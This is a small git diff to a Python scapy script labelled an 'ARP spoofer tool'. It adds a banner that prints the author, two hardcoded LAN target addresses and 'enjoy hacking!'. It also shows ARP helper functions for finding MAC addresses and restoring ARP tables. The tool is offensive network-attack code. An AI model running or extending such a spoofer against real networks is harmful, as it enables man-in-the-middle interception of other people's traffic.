@@ -2,6 +2,14 @@
 import scapy.all as scapy
 from time import sleep
 
+def intro(targets):
+    print("*"*50)
+    print("Tool: ARP spoofer tool.")
+    print("Author: ArimaGH")
+    print(f"targets: {targets[0]} and {targets[1]}")
+    print("enjoy hacking!")
+    print("*"*50)
+
 def getMAC(ip):
     "get the MAC address of a given IP"
     ARPPacket = scapy.ARP(pdst=ip);
@@ -22,6 +30,8 @@ def restoreARPTable(sourceIP, destinationIP):
     destinationMAC = getMAC(destinationIP)
     ARPPacket = scapy.ARP(pdst=destinationIP, hwdst=destinationMAC, psrc=sourceIP, hwsrc=sourceMAC, op=2)
     scapy.send(ARPPacket, verbose=False)
+
+intro(['192.168.1.1', '192.168.1.2'])
 
 packetsSent = 0
 
